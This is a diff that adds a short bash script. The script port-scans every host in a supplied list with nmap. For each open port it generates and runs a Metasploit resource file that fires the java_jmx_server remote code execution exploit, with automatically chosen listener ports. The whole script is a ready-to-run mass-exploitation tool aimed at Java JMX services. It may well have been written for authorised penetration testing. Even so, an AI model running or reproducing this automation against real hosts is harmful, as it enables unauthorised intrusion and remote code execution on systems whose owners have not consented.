@@ -1,0 +1,48 @@
+#!/bin/bash
+# 20210219 kirby
+
+
+if [[ ! -f "$1" ]]
+then
+    echo "must supply file of hosts"
+    exit
+fi
+
+nmapfile=$(eval mktemp)
+cmdfile="${1}.msfcmd"
+report="${1}.report"
+lport=25000
+echo 'color false' > "$cmdfile"
+BORDER='##################################################' 
+
+for host in $(cat "$1" |sort -u |egrep -v '^$|#')
+do
+    nmap -T4 --open -p- -oN $nmapfile "$host" >/dev/null 2>&1
+    for port in $(egrep '/tcp.*open' $nmapfile |cut -d'/' -f1)
+    do
+        let lport++
+        while netstat -ant|grep LISTEN |grep ":$lport " >/dev/null 2>&1
+        do
+            let lport++
+        done
+        echo "echo \"$BORDER\"" >> "$cmdfile"
+        echo "echo 'TESTING $host:$port'" >> "$cmdfile"
+        echo "use exploit/multi/misc/java_jmx_server" >> "$cmdfile"
+        echo "set RPORT $port" >> "$cmdfile"
+        echo "set RHOSTS $host" >> "$cmdfile"
+        echo "set RHOST $host" >> "$cmdfile"
+        echo "set VERBOSE false" >> "$cmdfile"
+        echo "set JMXRMI jmxrmi" >> "$cmdfile"
+        echo "set LPORT $lport" >> "$cmdfile"
+        echo "set SRVPORT 8080" >> "$cmdfile"
+        echo "set SRVHOST 0.0.0.0" >> "$cmdfile"
+        echo "run" >> "$cmdfile"
+        echo "echo \"$BORDER\"" >> "$cmdfile"
+    done
+done
+echo "exit" >> "$cmdfile"
+echo "Running msf scan"
+/usr/share/metasploit-framework/msfconsole -q -n -r "$cmdfile" -o "$report"
+echo "Done.  Report is $report"
+rm -f "$nmapfile"
+
